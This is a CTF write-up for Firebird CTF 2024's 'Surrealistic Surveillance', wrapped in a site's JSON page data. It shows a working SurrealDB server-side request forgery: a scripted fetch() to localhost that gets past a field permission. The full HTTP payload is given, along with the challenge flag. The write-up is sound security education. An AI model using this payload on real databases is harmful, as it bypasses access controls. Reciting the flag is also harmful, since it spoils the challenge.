{"componentChunkName":"component---src-pages-blog-strapi-article-slug-tsx","path":"/blog/firebirdctf-2024-surrealistic-surveillance/","result":{"data":{"allStrapiArticle":{"nodes":[{"id":"66327996-ffbd-5ed5-adeb-761c2ce8834e","slug":"firebirdctf-2024-surrealistic-surveillance","title":"Firebird CTF 2024 - Surrealistic Surveillance (1000pts)","description":"https://ash.firebird.sh/challenges?id=11\nhttp://ash-chal.firebird.sh:36011/","content":{"data":{"content":"# Writeup\n![Screen Shot 2024-02-14 at 01.14.21.png](https://www.cms.void-dojo.ninja/uploads/Screen_Shot_2024_02_14_at_01_14_21_b99501e846.png)\nHint: \n```sql\nDEFINE FIELD flag ON TABLE metadata TYPE string PERMISSIONS FOR select WHERE session::ip() = '127.0.0.1', FOR create, update, delete NONE;\n```\nThis website looks really interesting üßê    \nand also the poem... a little bit ‰∏≠‰∫åÁóÖ but can;t refute.\n```text\nThe world is a strange place, where nothing is as it seems. We live in a constant state of illusion, where reality is distorted by unseen forces. We think we are free, but we are not. We think we are alone, but we are not. We think we are safe, but we are not.\n```\nHere involve new stuffs to me.    \n\n## Solving steps\n### Check any hidden element\nBy inspecting web source code and imported js module, check if there any stuffs SUS. Here I find a hidden input field and button, which will popup a dialog with some text (the author is trolling meüòê) after pressing the button...    \nIt seems not relevant to what we need, what a fake clue! ‚ùå\n![ss_hidden_input.png](https://www.cms.void-dojo.ninja/uploads/ss_hidden_input_0f432d292d.png)\n\n### Check network traffic\nFound that there are some request to url `/rpc`, and then the web fetch data from via websocket. The data includes Audit Logs, metadata, etc for the whole website I guess.\n![ash-chal.firebird.sh_36011_.png](https://www.cms.void-dojo.ninja/uploads/ash_chal_firebird_sh_36011_82195e5b24.png)\n![Screenshot 2024-01-22 044910.png](https://www.cms.void-dojo.ninja/uploads/Screenshot_2024_01_22_044910_8697809e90.png)\n\n### Figure out the service\nThe request and response seems follow some set of standard or protocol built up from websocket, but I can;t identify what service is it. To figure out the service, mutate the request to some incorrect value, then google the error message to figure out what backend service is it.\n1. Using Burpsuite to intercept the traffic (including websocket traffic)\n2. disconnect websocket, relaunch\n3. mutate the request with wrong value\n```json\n{\"id\":\"3\",\"method\":\"select\",\"params\":[\"flag\",]}\n```\n4. send to server\n5. server response\n```json\n{\"error\":{\"code\":-32000,\"message\":\"There was a problem with the database: Specify a namespace to use\"},\"id\":\"3\"}\n```\n6. search the error message from github, found that the service is `surrealdb`\n![Screenshot 2024-02-14 044733.png](https://www.cms.void-dojo.ninja/uploads/Screenshot_2024_02_14_044733_1a01dc9fc6.png)\n\n### Surrealdb\nSurrealdb support many different protocol, here we focus on the websocket integration, see [surrealdb websocket docs](https://docs.surrealdb.com/docs/integration/websocket/).   \nBefore sending the query request, we need to set `namespace` with `use` function, this is given by what we intercept with Burpsuite:\n![Screenshot 2024-01-22 044932.png](https://www.cms.void-dojo.ninja/uploads/Screenshot_2024_01_22_044932_a3fe0c56a4.png)\n![Screenshot 2024-01-22 044947.png](https://www.cms.void-dojo.ninja/uploads/Screenshot_2024_01_22_044947_59dbbeaae5.png)\n\n\n#### Run custom queries\nreference: \n[custom query](https://docs.surrealdb.com/docs/integration/http/#sql)\nWe can POST to `/sql` to run some custom queries. Follow official docs to query the flag. From the hint we know that the flag is defined in metadata table, so POST with query statement to `/sql` should get the flag...isn't it‚ùî\n```text\nPOST\n\nSELECT * FROM metadata\n```\nNO‚ùïFrom the flag field there are some constraints restricting us from accessing it.\n```sql\n... TYPE string PERMISSIONS FOR select WHERE session::ip() = '127.0.0.1', FOR create, update, delete NONE;\n```\n1. only localhost can see flag field\n2. not allow to create / update / delete flag field, read only\n\n#### Custom queries with Functions\nDig deeper into the official docs... I found [surrealDb builtin function](https://docs.surrealdb.com/docs/1.0.x/surrealql/functions/script/built-in-functions)   \nTLDR;   \nRETURN caluse + Built-in function can run some JavaScript utilities, e.g. `fetch() API`.   \nWe can request to run a custom query, that execute fetch (POST) to localhost for querying the flag field from metadata tableüò≤!!!   \nHere we get it!!!\n![Screenshot 2024-01-22 053051.png](https://www.cms.void-dojo.ninja/uploads/Screenshot_2024_01_22_053051_08023bb5f7.png)\n\n# Get it!\nDetails request & response payload\n```json\nPOST /sql HTTP/1.1\nNS: firebird\nDB: surveillance-platform\nAccept: application/json\nContent-Type: text/plain\nUser-Agent: PostmanRuntime/7.36.1\nCache-Control: no-cache\nPostman-Token: 0fad747a-d2df-4899-9558-b8544d50efa7\nHost: [ash-chal.firebird.sh:36012](http://ash-chal.firebird.sh:36012/)\nAccept-Encoding: gzip, deflate, br\nConnection: keep-alive\nContent-Length: 301\n\nRETURN function() {\nreturn (await fetch('http://127.0.0.1:8000/sql', {\nmethod: 'POST',\nheaders:{\nAccept: \"application/json\",\nNS: \"firebird\",\nDB: \"surveillance-platform\"\n},\nbody: \"SELECT * FROM metadata\"\n})).json()\n}\n```\n```json\nHTTP/1.1 200 OK\ncontent-type: application/json\ncontent-length: 203\naccess-control-allow-origin: *\nvary: origin\nvary: access-control-request-method\nvary: access-control-request-headers\nsurreal-version: surrealdb-1.1.0+20240109.05682e3\nserver: SurrealDB\nx-request-id: b23e5b24-7e9c-44ee-a21e-a761267522d9\ndate: Sun, 21 Jan 2024 21:20:37 GMT\n\n[{\"result\":[{\"result\":[{\"flag\":\"firebird{surr34l_f13ld_l3v3l_s3cur1ty}\",\"id\":\"metadata:1\",\"lastUpdate\":\"2024-01-21T11:27:34.423Z\"}],\"status\":\"OK\",\"time\":\"249.608¬µs\"}],\"status\":\"OK\",\"time\":\"2.396897ms\"}]\n```\nflag: `firebird{surr34l_f13ld_l3v3l_s3cur1ty}`"}},"updatedAt":"2024-02-14T19:02:46.465Z","publishedAt":"2024-02-13T17:35:37.016Z","tags":[{"name":"firebirdctf","color":"red"},{"name":"web","color":"dark"}],"categories":[],"cover":{"formats":{"thumbnail":{"url":"/uploads/thumbnail_firebirdctf_2024_4c8f24745f.png"},"small":null}}}]}},"pageContext":{"id":"66327996-ffbd-5ed5-adeb-761c2ce8834e","slug":"firebirdctf-2024-surrealistic-surveillance","__params":{"slug":"firebirdctf-2024-surrealistic-surveillance"}}},"staticQueryHashes":["3001278788"],"slicesMap":{}}